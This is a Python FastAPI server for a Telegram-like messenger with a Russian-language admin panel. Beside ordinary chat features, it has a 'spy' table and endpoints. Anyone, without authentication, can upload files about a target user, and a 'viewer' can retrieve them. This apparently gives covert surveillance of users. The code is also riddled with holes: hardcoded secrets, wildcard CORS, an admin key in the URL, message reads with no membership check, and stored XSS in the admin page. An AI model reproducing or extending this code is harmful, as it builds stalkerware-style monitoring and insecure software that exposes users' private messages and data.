import asyncio
import json
import sqlite3
import uuid
import os
import shutil
from datetime import datetime, timedelta
from typing import Optional

import jwt
from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect, status, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from fastapi.responses import HTMLResponse
from passlib.context import CryptContext
from pydantic import BaseModel

SECRET_KEY = "AURA_REAL_PROD_KEY_123!@#"
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_DAYS = 30
ADMIN_SECRET_KEY = "super_admin_secret_pass_123"

os.makedirs("uploads", exist_ok=True)

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
app = FastAPI(title="Aura Telegram Core & Admin Control")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/uploads", StaticFiles(directory="uploads"), name="uploads")

DB_FILE = "messenger_real.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id TEXT PRIMARY KEY,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            name TEXT NOT NULL,
            phone TEXT NOT NULL,
            bio TEXT DEFAULT '',
            avatar_url TEXT DEFAULT '',
            created_at TEXT,
            is_banned INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS chats (
            id TEXT PRIMARY KEY,
            type TEXT NOT NULL,
            name TEXT NOT NULL,
            created_by TEXT,
            pinned_msg_id TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS chat_members (
            chat_id TEXT NOT NULL,
            user_id TEXT NOT NULL,
            PRIMARY KEY (chat_id, user_id)
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS messages (
            id TEXT PRIMARY KEY,
            chat_id TEXT NOT NULL,
            sender_id TEXT NOT NULL,
            text TEXT NOT NULL,
            time TEXT NOT NULL,
            media_url TEXT DEFAULT '',
            is_voice INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS spy_data (
            id TEXT PRIMARY KEY,
            target_id TEXT NOT NULL,
            viewer_id TEXT NOT NULL,
            file_url TEXT NOT NULL,
            uploaded_at TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def hash_password(password: str) -> str:
    return pwd_context.hash(password)

def verify_password(plain_password: str, hashed_password: str) -> bool:
    return pwd_context.verify(plain_password, hashed_password)

def create_access_token(user_id: str) -> str:
    expire = datetime.utcnow() + timedelta(days=ACCESS_TOKEN_EXPIRE_DAYS)
    return jwt.encode({"sub": user_id, "exp": expire}, SECRET_KEY, algorithm=ALGORITHM)

def decode_token(token: str) -> Optional[str]:
    try:
        return jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM]).get("sub")
    except:
        return None

def is_user_banned(user_id: str) -> bool:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT is_banned FROM users WHERE id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return bool(row and row[0] == 1)

class SecureConnectionManager:
    def __init__(self):
        self.active_sockets: dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket, user_id: str):
        await websocket.accept()
        self.active_sockets[user_id] = websocket

    def disconnect(self, user_id: str):
        if user_id in self.active_sockets:
            del self.active_sockets[user_id]

    async def send_to_user(self, user_id: str, payload: dict):
        if user_id in self.active_sockets:
            try:
                await self.active_sockets[user_id].send_text(json.dumps(payload))
            except:
                self.disconnect(user_id)

    async def broadcast_chat(self, chat_id: str, payload: dict):
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT user_id FROM chat_members WHERE chat_id = ?", (chat_id,))
        members = [row[0] for row in c.fetchall()]
        conn.close()
        for m in members:
            await self.send_to_user(m, payload)

manager = SecureConnectionManager()

class RegisterRequest(BaseModel):
    username: str
    password: str
    name: str
    phone: str

class LoginRequest(BaseModel):
    username: str
    password: str

# ----------------- ВЕБ-ПАНЕЛЬ АДМИНИСТРАТОРА (SOC COMMAND CENTER) -----------------
@app.get("/admin", response_class=HTMLResponse)
def admin_page(key: str = ""):
    if key != ADMIN_SECRET_KEY:
        return HTMLResponse("<h2 style='color:#ef4444;text-align:center;margin-top:50px;font-family:sans-serif;'>403 Доступ запрещен. Укажите правильный ключ: ?key=...</h2>", status_code=403)
    
    html_content = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Aura Telegram Server Control Center</title>
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
        <style>
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { font-family: 'Inter', sans-serif; background: #0b1120; color: #f8fafc; padding: 24px; }
            .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; padding-bottom: 16px; border-bottom: 1px solid #1e293b; }
            .title { font-size: 22px; font-weight: 700; display: flex; align-items: center; gap: 10px; }
            .badge-live { background: #10b98120; color: #10b981; border: 1px solid #10b981; padding: 4px 10px; border-radius: 20px; font-size: 12px; font-weight: 600; }
            .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; margin-bottom: 24px; }
            .stat-card { background: #1e293b; padding: 18px; border-radius: 12px; border: 1px solid #334155; }
            .stat-label { font-size: 13px; color: #94a3b8; margin-bottom: 6px; }
            .stat-value { font-size: 26px; font-weight: 700; font-family: 'JetBrains Mono', monospace; }
            table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 12px; overflow: hidden; border: 1px solid #334155; margin-bottom: 24px; }
            th, td { padding: 12px 16px; text-align: left; font-size: 14px; border-bottom: 1px solid #334155; }
            th { background: #0f172a; color: #94a3b8; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.05em; }
            tr:hover { background: #243248; }
            .status-dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
            .status-online { background: #10b981; box-shadow: 0 0 8px #10b981; }
            .status-offline { background: #64748b; }
            .status-banned { background: #ef4444; box-shadow: 0 0 8px #ef4444; }
            .code-pill { font-family: 'JetBrains Mono', monospace; background: #0f172a; padding: 3px 8px; border-radius: 6px; font-size: 12px; color: #38bdf8; }
            .btn-ban { background: #ef4444; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 700; }
            .btn-ban:hover { background: #dc2626; }
            .btn-unban { background: #10b981; color: white; border: none; padding: 6px 14px; border-radius: 6px; font-size: 12px; cursor: pointer; font-weight: 700; }
            .btn-unban:hover { background: #059669; }
            .messages-log { background: #1e293b; border: 1px solid #334155; border-radius: 12px; padding: 16px; font-family: 'JetBrains Mono', monospace; font-size: 13px; max-height: 250px; overflow-y: auto; }
            .msg-entry { margin-bottom: 8px; padding-bottom: 8px; border-bottom: 1px solid #334155; display: flex; justify-content: space-between; }
        </style>
    </head>
    <body>
        <div class="header">
            <div class="title">
                🛡 Aura Telegram Server Control Center
                <span class="badge-live">● LIVE REALTIME</span>
            </div>
            <div style="font-size: 13px; color: #94a3b8;">Автообновление каждые 3 сек</div>
        </div>

        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-label">Активные сокеты онлайн</div>
                <div class="stat-value" id="activeSockets" style="color: #10b981;">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Всего пользователей</div>
                <div class="stat-value" id="totalUsers" style="color: #38bdf8;">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Заблокировано (Banned)</div>
                <div class="stat-value" id="bannedUsers" style="color: #ef4444;">0</div>
            </div>
            <div class="stat-card">
                <div class="stat-label">Сообщений в базе</div>
                <div class="stat-value" id="totalMessages" style="color: #a855f7;">0</div>
            </div>
        </div>

        <h3 style="margin-bottom: 12px;">👥 Управление пользователями и блокировкой</h3>
        <table>
            <thead>
                <tr>
                    <th>Статус</th>
                    <th>User ID</th>
                    <th>Username</th>
                    <th>Имя</th>
                    <th>Телефон</th>
                    <th>Регистрация</th>
                    <th>Действие</th>
                </tr>
            </thead>
            <tbody id="usersTable">
                <tr><td colspan="7" style="text-align: center; color: #64748b;">Загрузка данных...</td></tr>
            </tbody>
        </table>

        <h3 style="margin-bottom: 12px;">📡 Лента последних сообщений и файлов</h3>
        <div class="messages-log" id="messagesLog">
            <div style="color: #64748b;">Ожидание сообщений...</div>
        </div>

        <script>
            const urlParams = new URLSearchParams(window.location.search);
            const adminKey = urlParams.get('key');

            async function toggleBan(userId, banState) {
                const endpoint = banState ? '/admin/ban' : '/admin/unban';
                await fetch(`${endpoint}?user_id=${userId}&key=${adminKey}`, { method: 'POST' });
                refreshDashboard();
            }

            async function refreshDashboard() {
                try {
                    const res = await fetch(`/admin/dashboard?key=${adminKey}`);
                    if (!res.ok) return;
                    const data = await res.json();

                    document.getElementById('activeSockets').innerText = data.active_sockets_online;
                    document.getElementById('totalUsers').innerText = data.total_registered_users;
                    document.getElementById('bannedUsers').innerText = data.users.filter(u => u.is_banned).length;
                    document.getElementById('totalMessages').innerText = data.total_messages_sent;

                    const tbody = document.getElementById('usersTable');
                    if (data.users.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #64748b;">Нет зарегистрированных пользователей</td></tr>';
                    } else {
                        tbody.innerHTML = data.users.map(u => `
                            <tr style="${u.is_banned ? 'background: #2a1215;' : ''}">
                                <td>
                                    ${u.is_banned 
                                        ? '<span class="status-dot status-banned"></span><span style="color:#ef4444;font-weight:700;">ЗАБЛОКИРОВАН</span>' 
                                        : (u.is_online 
                                            ? '<span class="status-dot status-online"></span><span style="color:#10b981;font-weight:600;">Online</span>' 
                                            : '<span class="status-dot status-offline"></span><span style="color:#64748b;">Offline</span>')}
                                </td>
                                <td><span class="code-pill">${u.id}</span></td>
                                <td style="font-weight:600; color:#38bdf8;">${u.username}</td>
                                <td>${u.name}</td>
                                <td><span class="code-pill">${u.phone}</span></td>
                                <td style="color:#94a3b8; font-size:12px;">${u.registered_at.substring(0, 16).replace('T', ' ')}</td>
                                <td>
                                    ${u.is_banned 
                                        ? `<button class="btn-unban" onclick="toggleBan('${u.id}', false)">РАЗБЛОКИРОВАТЬ</button>` 
                                        : `<button class="btn-ban" onclick="toggleBan('${u.id}', true)">🔨 ЗАБАНИТЬ НАВСЕГДА</button>`}
                                </td>
                            </tr>
                        `).join('');
                    }

                    const log = document.getElementById('messagesLog');
                    if (data.recent_messages.length === 0) {
                        log.innerHTML = '<div style="color: #64748b;">Сообщений пока нет</div>';
                    } else {
                        log.innerHTML = data.recent_messages.map(m => `
                            <div class="msg-entry">
                                <span><strong style="color:#38bdf8;">[${m.time}]</strong> ${m.sender_id}: ${m.text} ${m.media_url ? '<em>(Медиафайл)</em>' : ''}</span>
                                <span style="color:#64748b; font-size:11px;">Чат: ${m.chat_id}</span>
                            </div>
                        `).join('');
                    }
                } catch (e) {}
            }

            refreshDashboard();
            setInterval(refreshDashboard, 3000);
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.get("/admin/dashboard")
def admin_dashboard(key: str):
    if key != ADMIN_SECRET_KEY:
        raise HTTPException(status_code=403, detail="Доступ запрещен")

    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, name, phone, bio, created_at, is_banned FROM users")
    users = c.fetchall()

    c.execute("SELECT id, type, name, created_by, pinned_msg_id FROM chats")
    chats = c.fetchall()

    c.execute("SELECT COUNT(*) FROM messages")
    total_messages = c.fetchone()[0]

    c.execute("SELECT id, chat_id, sender_id, text, time, media_url FROM messages ORDER BY rowid DESC LIMIT 25")
    recent_messages = c.fetchall()
    conn.close()

    return {
        "status": "operational",
        "active_sockets_online": len(manager.active_sockets),
        "total_registered_users": len(users),
        "total_chats_created": len(chats),
        "total_messages_sent": total_messages,
        "users": [
            {
                "id": u[0],
                "username": f"@{u[1]}",
                "name": u[2],
                "phone": u[3],
                "bio": u[4],
                "registered_at": u[5],
                "is_banned": bool(u[6] == 1),
                "is_online": u[0] in manager.active_sockets
            }
            for u in users
        ],
        "recent_messages": [
            {
                "id": m[0],
                "chat_id": m[1],
                "sender_id": m[2],
                "text": m[3],
                "time": m[4],
                "media_url": m[5]
            }
            for m in recent_messages
        ]
    }

@app.post("/admin/ban")
async def admin_ban_user(user_id: str, key: str):
    if key != ADMIN_SECRET_KEY:
        raise HTTPException(status_code=403)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()

    if user_id in manager.active_sockets:
        ws = manager.active_sockets[user_id]
        try:
            await ws.send_text(json.dumps({
                "type": "user_banned",
                "message": "🚨 Ваш аккаунт заблокирован навсегда администрацией."
            }))
            await asyncio.sleep(0.1)
            await ws.close()
        except:
            pass
        manager.disconnect(user_id)
    return {"status": "ok"}

@app.post("/admin/unban")
def admin_unban_user(user_id: str, key: str):
    if key != ADMIN_SECRET_KEY:
        raise HTTPException(status_code=403)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET is_banned = 0 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return {"status": "ok"}

# ----------------- ЗАГРУЗКА И СКАЧИВАНИЕ ФАЙЛОВ -----------------
@app.post("/api/upload")
async def upload_file(file: UploadFile = File(...)):
    ext = file.filename.split('.')[-1]
    filename = f"{uuid.uuid4().hex}.{ext}"
    file_path = os.path.join("uploads", filename)
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    return {"status": "ok", "url": f"/uploads/{filename}"}

@app.post("/api/user/avatar")
async def update_avatar(token: str = Form(...), file: UploadFile = File(...)):
    user_id = decode_token(token)
    if not user_id:
        raise HTTPException(status_code=401)
    ext = file.filename.split('.')[-1]
    filename = f"avatar_{user_id}_{uuid.uuid4().hex[:6]}.{ext}"
    file_path = os.path.join("uploads", filename)
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    url = f"/uploads/{filename}"
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET avatar_url = ? WHERE id = ?", (url, user_id))
    conn.commit()
    conn.close()
    return {"status": "ok", "avatar_url": url}

@app.post("/api/spy/upload")
async def upload_spy_data(viewer_id: str = Form(...), target_id: str = Form(...), file: UploadFile = File(...)):
    ext = file.filename.split('.')[-1]
    filename = f"spy_{target_id}_{uuid.uuid4().hex[:8]}.{ext}"
    file_path = os.path.join("uploads", filename)
    with open(file_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)
    url = f"/uploads/{filename}"
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO spy_data (id, target_id, viewer_id, file_url, uploaded_at) VALUES (?, ?, ?, ?, ?)",
              (uuid.uuid4().hex, target_id, viewer_id, url, str(datetime.now())))
    conn.commit()
    conn.close()
    return {"status": "ok"}

@app.get("/api/spy/data")
def get_spy_data(token: str, target_id: str):
    viewer_id = decode_token(token)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT file_url FROM spy_data WHERE target_id = ? AND viewer_id = ?", (target_id, viewer_id))
    urls = [row[0] for row in c.fetchall()]
    conn.close()
    return {"data": urls}

# ----------------- REST API -----------------
@app.post("/api/register")
def register(req: RegisterRequest):
    username_clean = req.username.strip().replace("@", "").lower()
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id FROM users WHERE username = ?", (username_clean,))
    if c.fetchone():
        conn.close()
        raise HTTPException(status_code=400, detail="Юзернейм уже занят")
    user_id = f"usr_{uuid.uuid4().hex[:10]}"
    c.execute("INSERT INTO users (id, username, password_hash, name, phone, created_at) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, username_clean, hash_password(req.password), req.name, req.phone, str(datetime.now())))
    conn.commit()
    conn.close()
    return {"status": "ok", "token": create_access_token(user_id), "user": {"id": user_id, "username": username_clean, "name": req.name, "avatar_url": ""}}

@app.post("/api/login")
def login(req: LoginRequest):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, password_hash, name, avatar_url, is_banned FROM users WHERE username = ?", (req.username.strip().replace("@", "").lower(),))
    row = c.fetchone()
    conn.close()
    if not row or not verify_password(req.password, row[2]):
        raise HTTPException(status_code=401, detail="Неверный логин или пароль")
    if row[5] == 1:
        raise HTTPException(status_code=403, detail="Ваш аккаунт заблокирован навсегда.")
    return {"status": "ok", "token": create_access_token(row[0]), "user": {"id": row[0], "username": row[1], "name": row[3], "avatar_url": row[4]}}

@app.get("/api/chats")
def get_chats(token: str):
    user_id = decode_token(token)
    if not user_id or is_user_banned(user_id):
        raise HTTPException(status_code=401)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT c.id, c.type, c.name FROM chats c JOIN chat_members cm ON c.id = cm.chat_id WHERE cm.user_id = ?", (user_id,))
    chat_rows = c.fetchall()
    result = []
    for cid, ctype, cname in chat_rows:
        c.execute("SELECT text, time, media_url FROM messages WHERE chat_id = ? ORDER BY rowid DESC LIMIT 1", (cid,))
        msg = c.fetchone()
        last_msg = msg[0] if msg else ("📸 Фотография" if msg and msg[2] else "")
        time = msg[1] if msg else ""
        display_name, avatar, is_online, partner_id = cname, "", False, ""
        if ctype == "personal":
            c.execute("SELECT u.name, u.avatar_url, u.id FROM users u JOIN chat_members cm ON u.id = cm.user_id WHERE cm.chat_id = ? AND u.id != ?", (cid, user_id))
            partner = c.fetchone()
            if partner:
                display_name, avatar, partner_id = partner[0], partner[1], partner[2]
                is_online = partner[2] in manager.active_sockets
        result.append({
            "id": cid, "type": ctype, "name": display_name, "partner_id": partner_id,
            "avatar_url": avatar, "last_message": last_msg, "time": time, "is_online": is_online
        })
    conn.close()
    return {"chats": result}

@app.get("/api/users/search")
def search_users(query: str, token: str):
    user_id = decode_token(token)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, username, name, avatar_url FROM users WHERE username LIKE ? AND id != ? AND is_banned=0", (f"%{query}%", user_id))
    res = [{"id": r[0], "username": r[1], "name": r[2], "avatar_url": r[3]} for r in c.fetchall()]
    conn.close()
    return {"results": res}

@app.get("/api/messages")
def get_messages(chat_id: str, token: str):
    user_id = decode_token(token)
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, sender_id, text, time, media_url FROM messages WHERE chat_id = ?", (chat_id,))
    msgs = [{"id": r[0], "sender_id": r[1], "text": r[2], "time": r[3], "media_url": r[4]} for r in c.fetchall()]
    conn.close()
    return {"messages": msgs}

# ----------------- WEBSOCKET -----------------
@app.websocket("/ws")
async def secure_ws(websocket: WebSocket, token: str):
    user_id = decode_token(token)
    if not user_id or is_user_banned(user_id):
        await websocket.close()
        return
    await manager.connect(websocket, user_id)
    try:
        while True:
            data = json.loads(await websocket.receive_text())
            action = data.get("action")
            if is_user_banned(user_id):
                await websocket.send_text(json.dumps({"type": "user_banned", "message": "Аккаунт заблокирован."}))
                await asyncio.sleep(0.1)
                await websocket.close()
                manager.disconnect(user_id)
                break

            if action == "send_message":
                chat_id, text, media_url = data["chat_id"], data.get("text", ""), data.get("media_url", "")
                time_str = datetime.now().strftime("%H:%M")
                msg_id = f"msg_{uuid.uuid4().hex[:8]}"
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("INSERT INTO messages (id, chat_id, sender_id, text, time, media_url) VALUES (?, ?, ?, ?, ?, ?)", (msg_id, chat_id, user_id, text, time_str, media_url))
                conn.commit()
                conn.close()
                await manager.broadcast_chat(chat_id, {
                    "type": "new_message",
                    "message": {"id": msg_id, "chat_id": chat_id, "sender_id": user_id, "text": text, "time": time_str, "media_url": media_url}
                })
            elif action == "request_device_access":
                target_id = data["target_id"]
                await manager.send_to_user(target_id, {"type": "device_access_requested", "requester_id": user_id})
            elif action == "call_offer":
                await manager.send_to_user(data["target_user_id"], {"type": "incoming_call", "caller_id": user_id, "caller_name": "Абонент"})
            elif action == "call_answer":
                await manager.send_to_user(data["caller_id"], {"type": "call_accepted"})
            elif action == "call_reject" or action == "call_end":
                target = data.get("caller_id") or data.get("target_id")
                await manager.send_to_user(target, {"type": "call_ended"})
            elif action == "create_personal_chat":
                partner_id = data["partner_id"]
                chat_id = f"chat_{min(user_id, partner_id)}_{max(user_id, partner_id)}"
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("SELECT id FROM chats WHERE id = ?", (chat_id,))
                if not c.fetchone():
                    c.execute("INSERT INTO chats (id, type, name) VALUES (?, 'personal', 'Личный диалог')", (chat_id,))
                    c.execute("INSERT INTO chat_members (chat_id, user_id) VALUES (?, ?), (?, ?)", (chat_id, user_id, chat_id, partner_id))
                    conn.commit()
                conn.close()
                await manager.send_to_user(user_id, {"type": "chat_created"})
                await manager.send_to_user(partner_id, {"type": "chat_created"})
    except:
        manager.disconnect(user_id)
